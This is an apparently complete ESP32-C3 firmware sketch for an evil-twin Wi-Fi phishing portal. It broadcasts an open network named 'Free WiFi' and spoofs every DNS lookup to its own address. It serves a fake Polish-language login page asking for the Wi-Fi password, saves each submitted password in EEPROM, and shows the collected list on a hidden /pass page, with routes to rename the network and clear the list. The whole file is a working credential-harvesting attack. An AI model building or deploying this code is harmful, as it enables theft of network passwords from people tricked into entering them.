// ESP32C3 WiFi Captive Portal 

// Libraries
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Free WiFi";

// Default main strings
#define SUBTITLE "Wi-Fi"
#define TITLE "Logowanie"
#define BODY "To jest strona logowania do Twojej sieci."
#define POST_TITLE "Trwa uwierzytelnianie..."
#define POST_BODY "Trwa logowanie do sieci Wi-Fi. Poczekaj prosze chwile... </br>Dziekuje."
#define PASS_TITLE "Hasla"
#define CLEAR_TITLE "Wyczyszczone"

// Init system settings
const byte led_gpio = 3; // LED connected to output 3
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String allPass = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; Wszelkie prawa zastrzezone.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
                "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                "div { padding: 0.5em; }"
                "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
                "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
                "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
                "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
                "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
                "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
              "<head><title>" + a + " :: " + t + "</title>"
                                                 "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                                                 "<style>" + CSS + "</style>"
                                                                    "<meta charset=\"UTF-8\"></head>"
                                                                    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Podaj haslo do Wi-Fi:</label>" +
         "<input type=password name=m></input><input type=submit value=Polacz></form>" + footer();
}

String posted() {
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in an ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to the existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating the end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Index</a></p><p><a style=\"color:blue\" href=/ssid>Zmien SSID</a></p><p><a style=\"color:blue\" href=/clear>Wyczysc hasla</a></p></center>" + footer();
}

String ssid() {
  return header("Zmien SSID") + "<p>Tutaj mozesz zmienic nazwe SSID. Po nacisnieciu przycisku „Zmien SSID” utracisz polaczenie, dlatego zrestartuj swoje urządzenie z Captive Portal i ponownie polacz sie z nowym identyfikatorem SSID.</p>" + "<form action=/postSSID method=post><label>Nowa nazwa SSID:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Zmien SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
}

String clear() {
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>Lista hasel zostala wyczyszczona.</div></p><center><a style=\"color:blue\" href=/pass>Powrot do Pass</a></center>" + footer();
}

void LEDON()
{ // After entering the password, the diode connected to the output declared in the led_gpio parameter will blink for 5 seconds and then be on constantly.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(led_gpio, counter % 2);
    delay(500);
  }
}

void LEDOFF()
{ // After clearing the password, the diode connected to the output declared in the led_gpio parameter will blink for 5 seconds and then turn off.
  for (int counter = 0; counter < 11; counter++)
  {
    // For blinking the LED.
    digitalWrite(led_gpio, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Serial begin
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the stored password in EEPROM.
    passEnd++;                             // Updating the end location of the password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post", []() { webServer.send(200, "text/html", posted()); LEDON(); });
  webServer.on("/ssid", []() { webServer.send(200, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(200, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(200, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(200, "text/html", clear()); LEDOFF(); });
  webServer.onNotFound([]() { lastActivity = millis(); webServer.send(200, "text/html", index()); });
  webServer.begin();

  // Turn on the LED and turn off the LED after 1 second
  pinMode(led_gpio, OUTPUT);
  digitalWrite(led_gpio, HIGH);
  delay(1000);
  digitalWrite(led_gpio, LOW);
  delay(1000);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
